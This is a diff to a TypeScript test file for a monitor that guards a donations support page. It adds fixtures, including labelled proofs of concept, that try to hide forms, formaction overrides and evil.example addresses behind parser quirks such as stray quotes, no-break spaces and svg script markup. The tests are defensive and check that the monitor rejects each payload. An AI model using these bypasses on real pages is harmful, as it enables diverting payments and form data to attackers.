@@ -58,14 +58,65 @@ test('Discord country redirect preserves the query under the root launch policy'
   }
 });
 
+// The monitor reads the support page with a real HTML parser, so its fixtures are whole documents (a fragment has no doctype).
+const supportDocument = (main: string, head = '<meta charset="utf-8"><meta name="referrer" content="no-referrer">') =>
+  `<!doctype html><html lang="en-US"><head>${head}<title>t</title></head><body><main>${main}</main></body></html>`;
+const formTo = (action: string, amount = 'amount', locale = 'pt-br') => `<form method="post" action="${action}"><input type="hidden" name="locale" value="${locale}"><input name="${amount}" type="text" inputmode="decimal" required maxlength="14"><input name="display_name" type="text" maxlength="20"><button type="submit">Doar</button></form>`;
+const openBlock = (form = formTo('/donations/api/v1/checkout'), inBlock = '') => `<div data-donations="open">${form}${inBlock}</div>`;
+
 test('payment blocks are support-only; released wording may vary, payment markers never pass', () => {
-  const block = '<p data-donations="not-open">Donations are not open.</p>';
+  const block = supportDocument('<p data-donations="not-open">Donations are not open.</p>');
   assert.deepEqual(noPayment(block, true), []);
   assert.deepEqual(noPayment('contact@empirecommunity.org', false), []);
-  for (const html of ['', block + block, '<p data-donations="not-open"><a href="/">go</a></p>']) assert.ok(noPayment(html, true).length > 0);
+  for (const html of [
+    '', supportDocument('<p data-donations="not-open">x</p><p data-donations="not-open">y</p>'),
+    supportDocument('<p data-donations="not-open"><a href="/">go</a></p>'), supportDocument('<p data-donations="not-open"> </p>'),
+    supportDocument('<p data-donations="not-open">Donations are not open.</p>', '<meta charset="utf-8">'),
+    supportDocument('<p data-donations="not-open">Donations are not open.</p>', '<meta name="referrer" content="no-referrer">'),
+  ]) assert.ok(noPayment(html, true).length > 0, html);
   assert.ok(noPayment(block, false).length > 0);
   for (const marker of ['data-pix', 'https://mpago.la/x', 'BR.GOV.BCB.PIX', 'someone@example.com',
     '123e4567-e89b-42d3-a456-426614174000', '123.456.789-09', '12.345.678/0001-95']) assert.ok(noPayment(marker, false).length > 0);
+});
+
+test('the live support page may carry the open block: one form to the donations service and nothing else (P2-09)', () => {
+  assert.deepEqual(noPayment(supportDocument(openBlock()), true), []);
+  for (const html of [
+    supportDocument(openBlock(formTo('https://www.mercadopago.com.br/checkout/v1/redirect'))),
+    supportDocument(openBlock(formTo('/donations/api/v1/other'))),
+    supportDocument(openBlock(formTo('/donations/api/v1/checkout', 'amount_cents'))),
+    supportDocument(openBlock(), '<meta name="referrer" content="no-referrer">'),
+  ]) assert.ok(noPayment(html, true).length > 0, html);
+  assert.ok(noPayment(supportDocument(openBlock()), false).length > 0, 'the block belongs to support only');
+});
+
+test('the live support page is scanned whole: a form attribute, an override or a named control outside the block fails, even behind a quoted greater-than (P2-09 m2)', () => {
+  assert.deepEqual(noPayment(supportDocument(openBlock()), true, 'pt-br'), []);
+  assert.ok(noPayment(supportDocument(openBlock()), true, 'en-us').length > 0, 'the pt-br form on the en-us path');
+  for (const stray of ['<input name="amount" form="x">', '<a href="/x" formaction="https://x.test/">x</a>', '<input title="a>b" form="x">', '<a title="a>b" formaction="https://x.test/">x</a>', '<input name="display_name">']) {
+    assert.ok(noPayment(supportDocument(openBlock() + stray), true, 'pt-br').length > 0, stray);
+  }
+  assert.ok(noPayment(supportDocument('<p data-donations="not-open">Donations are not open.</p><div data-donations-panel hidden></div>'), true, 'pt-br').length > 0, 'a panel marker while not open');
+});
+
+// Sentinela's proofs of concept against the monitor (P2-09 re-checks M1, M2, D1, D2, E1 to E3): each hides a control or an address
+// from a hand-written scanner while a browser builds it; the monitor reads the tree a browser builds.
+test('the live monitor refuses Sentinela\'s proofs of concept: quotes, a no-break space, svg script markup, a coded slash, a tab between the slashes', () => {
+  const evil = '<button form=donation-form formaction=/x name=evil value=1>go</button>';
+  const attacks: [string, string][] = [
+    ['A: an unquoted value ending in a quote hides form, formaction and name', supportDocument(openBlock() + '<button form=donation-form formaction=/x name=evil value=a">go</button>')],
+    ['B: the same hides a second form', supportDocument(openBlock() + '<form method=post action=//evil.example/ id=a"><input name=amount></form>')],
+    ['C1: a second slash as a character reference', supportDocument(openBlock(undefined, '<a href="/&#47;evil.example/pay">x</a>'))],
+    ['C2: a tab between the slashes', supportDocument(openBlock(undefined, '<a href="/\t/evil.example/pay">x</a>'))],
+    ['D1: a no-break space after the tag name', supportDocument(openBlock() + `<p\u00a0x=">${evil}">`)],
+    ['D2: a vertical tab after the tag name', supportDocument(openBlock() + `<p\u000Bx=">${evil}">`)],
+    ['E1: an svg script with src and markup inside it', supportDocument(openBlock() + `<svg><script src="/_astro/x.js"><p>${evil}</p></script></svg>`)],
+    ['E2: an svg script of type ld+json and markup inside it', supportDocument(openBlock() + `<svg><script type="application/ld+json"><p>${evil}</p></script></svg>`)],
+    ['E3: an svg style and markup inside it', supportDocument(openBlock() + `<svg><style><p>${evil}</p></style></svg>`)],
+    ['S6: an svg animation rewriting an address in the block', supportDocument(openBlock(undefined, '<svg><a href="/x"><animate attributeName="href" values="//evil.example/"/></a></svg>'))],
+  ];
+  assert.deepEqual(noPayment(supportDocument(openBlock()), true, 'pt-br'), [], 'the baseline passes');
+  for (const [label, html] of attacks) assert.ok(noPayment(html, true, 'pt-br').length > 0, label);
 });
 
 test('support rewriting markers fail while ordinary HTML passes', () => {
@@ -92,7 +143,7 @@ test('live member schema, source and three-day freshness boundary use injected t
 
 test('public header invariants detect missing headers, CSP changes, cookies and version disclosure', () => {
   const headers = {
-    'content-security-policy': "default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
+    'content-security-policy': "default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self' https://www.mercadopago.com.br; frame-ancestors 'none'",
     'permissions-policy': 'camera=(), microphone=(), geolocation=(), payment=(), interest-cohort=()',
     'cross-origin-opener-policy': 'same-origin', 'cache-control': 'no-cache', 'x-content-type-options': 'nosniff',
     'referrer-policy': 'strict-origin-when-cross-origin', 'strict-transport-security': 'max-age=31536000',
